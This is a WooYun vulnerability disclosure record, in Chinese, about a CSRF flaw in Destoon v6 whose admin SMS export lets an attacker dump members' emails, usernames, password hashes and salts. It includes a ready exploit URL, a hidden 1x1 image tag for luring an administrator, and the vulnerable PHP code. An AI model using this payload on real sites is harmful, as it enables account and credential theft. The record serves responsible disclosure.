{"id": 72427, "wybug_id": "wooyun-2015-0143172", "wybug_title": "destoon v6版csrf可导致全站账户密码泄漏", "wybug_corp": "DESTOON", "wybug_author": "xiao.k", "wybug_date": "2015-10-10 11:38", "wybug_open_date": "2016-01-11 15:34", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 对客户端的请求不要太信任。 详细说明：  在程序设计上，destoon对于前台提交的数据过于信任，导致出现了一定的安全问题。希望官方能重新看一下代码，因为这样的设计还有很多处。## 利用首先根据下方的地址，构造链接。把test.com换成你的目标。\nhttp://test.com/admin.php?moduleid=2&file=sendsms&action=make&make=1&tb=destoon_member&field=concat/**/(email,username,password,passsalt)&sql=1=1&num=1000&title=1234&submit=1\n你可以把这个请求伪装成图片请求。然后通过站内信，引诱管理员访问此链接。\n<img src=\"http://test.com/admin.php?moduleid=2&file=sendsms&action=make&make=1&tb=destoon_member&field=concat/**/(email,username,password,passsalt)&sql=1=1&num=1000&title=1234&submit=1\" height=\"1\" width=\"1\">\n当管理员访问此链接以后，可以访问下方的链接，获取目标网站的邮箱、用户名、密码和salt。\nhttp://test.com/file/mobile/20150924_9250_1.txt\n20150924是访问链接时的日期。## 漏洞原理问题代码在module/member/admin/sendsms.inc.php 33-63行\ncase 'make':\t\t\t\tif(isset($make)) {\t\t\t$tb or $tb = $DT_PRE.'member';\t\t\t$field or $field = 'mobile';\t\t\t$sql or $sql = 'groupid>4';\t\t\t$sql = stripslashes($page == 1 ? $sql : base64_decode($sql));\t\t\t$num or $num = 1000;\t\t\t$pagesize = $num;\t\t\t$offset = ($page-1)*$pagesize;\t\t\tif($page == 1) $random = $title ? $title : mt_rand(1000, 9999);\t\t\techo $sql;\t\t\t$result = $db->query(\"SELECT $field FROM $tb WHERE $sql LIMIT $offset,$pagesize\");\t\t\t$mail = '';\t\t\techo \"SELECT $field FROM $tb WHERE $sql LIMIT $offset,$pagesize\";\t\t\twhile($r = $db->fetch_array($result)) {\t\t\t\t\t\t\tif($r[$field]) $mail .= $r[$field].\"\\r\\n\";\t\t\t}\t\t\tif($mail) {\t\t\t\t$filename = timetodate($DT_TIME, 'Ymd').'_'.$random.'_'.$page.'.txt';\t\t\t\tfile_put(DT_ROOT.'/file/mobile/'.$filename, trim($mail));\t\t\t\t$page++;\t\t\t\tmsg('文件'.$filename.'获取成功。<br/>请稍候，程序将自动继续...', '?moduleid='.$moduleid.'&file='.$file.'&action='.$action.'&tb='.urlencode($tb).'&field='.urlencode($field).'&sql='.urlencode(base64_encode($sql)).'&num='.$num.'&page='.$page.'&random='.urlencode($random).'&make=1');\t\t\t} else {\t\t\t\tmsg('列表获取成功', '?moduleid='.$moduleid.'&file='.$file.'&action=list');\t\t\t}\t\t} else {\t\t\tinclude tpl('sendsms_make', $module);\t\t}\tbreak;\nsql语句中的 $field 和 $tb 还有 $sql 都是从客户端请求的。在这里我们可以任意构造语句。大家兴许还看到了 \nif($page == 1) $random = $title ? $title : mt_rand(1000, 9999);\n本来还有个随机数阻挡一下的，但是如果有title变量，随机数都省了。ps：在实验的时候，官方不能识别concat函数。那么我们字段可以只设置password 然后在sql参数上写限制。例如userid=1.那就只导出第一个用户的密码。   漏洞证明：  本地实验的数据\n\n这个是本地获取到的数据\n\n这个是官方的hash\n\n   修复方案：  把逻辑问题放到后端处理。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-10 12:20 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-15 16:37 |    \t\t生鲜一手 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:4        | null)\t\t \n  围观    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}